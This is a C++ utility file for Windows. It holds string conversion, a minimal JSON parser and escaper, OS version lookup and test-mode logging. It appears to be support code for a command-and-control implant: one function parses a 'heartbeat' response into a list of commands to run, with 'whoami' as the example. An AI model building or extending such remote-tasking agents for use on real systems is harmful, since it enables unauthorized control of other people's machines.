#include "utils.h"
#include "config.h"
#include <windows.h>
#include <algorithm>
#include <cstdio>

// ===================== String Helpers =====================

std::wstring to_wide(const std::string& s) {
    if (s.empty()) return L"";
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring ws(len - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &ws[0], len);
    return ws;
}

std::string to_narrow(const std::wstring& ws) {
    if (ws.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &s[0], len, nullptr, nullptr);
    return s;
}

std::string to_lower(const std::string& s) {
    std::string out = s;
    std::transform(out.begin(), out.end(), out.begin(), ::tolower);
    return out;
}

// ===================== JSON Helpers =====================

// Extract a string value for a given key from a flat JSON object
// e.g. json_get("{\"client_id\":\"abc123\"}", "client_id") => "abc123"
std::string json_get(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    
    // Find the colon after the key
    pos = json.find(':', pos + search.length());
    if (pos == std::string::npos) return "";
    pos++;
    
    // Skip whitespace
    while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    
    if (pos >= json.length()) return "";
    
    // Check if value is a string (starts with ")
    if (json[pos] == '"') {
        pos++;
        size_t end = json.find('"', pos);
        if (end == std::string::npos) return "";
        return json.substr(pos, end - pos);
    }
    
    // Otherwise read until comma or closing brace
    size_t end = json.find_first_of(",}]", pos);
    if (end == std::string::npos) return json.substr(pos);
    return json.substr(pos, end - pos);
}

// Escape a string for embedding in JSON
std::string json_escape(const std::string& s) {
    std::string out;
    out.reserve(s.length() + 16);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:   out += c;
        }
    }
    return out;
}

// Parse task list from heartbeat response
// Input: {"tasks": [{"cmd_id":"a1b2","command":"whoami"}, ...]}
// Returns: vector of (cmd_id, command) pairs
std::vector<std::pair<std::string,std::string>> json_parse_tasks(const std::string& json) {
    std::vector<std::pair<std::string,std::string>> tasks;
    
    // Find the tasks array
    size_t arr_start = json.find('[');
    size_t arr_end = json.rfind(']');
    if (arr_start == std::string::npos || arr_end == std::string::npos) return tasks;
    
    // Find each object {...} in the array
    size_t pos = arr_start;
    while (pos < arr_end) {
        size_t obj_start = json.find('{', pos);
        if (obj_start == std::string::npos || obj_start >= arr_end) break;
        size_t obj_end = json.find('}', obj_start);
        if (obj_end == std::string::npos) break;
        
        std::string obj = json.substr(obj_start, obj_end - obj_start + 1);
        std::string cmd_id = json_get(obj, "cmd_id");
        std::string command = json_get(obj, "command");
        
        if (!command.empty()) {
            tasks.push_back({cmd_id, command});
        }
        pos = obj_end + 1;
    }
    return tasks;
}

// ===================== System Info =====================

std::string get_os_info() {
    // Use RtlGetVersion for accurate Windows version
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        auto fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW vi = { sizeof(vi) };
            fn(&vi);
            char buf[128];
            snprintf(buf, sizeof(buf), "Windows %lu.%lu.%lu",
                     vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
            return std::string(buf);
        }
    }
    return "Windows (unknown)";
}

// ===================== Logging =====================

void log_msg(const std::string& msg) {
#if TEST_MODE
    printf("[*] %s\n", msg.c_str());
    fflush(stdout);
#endif
}
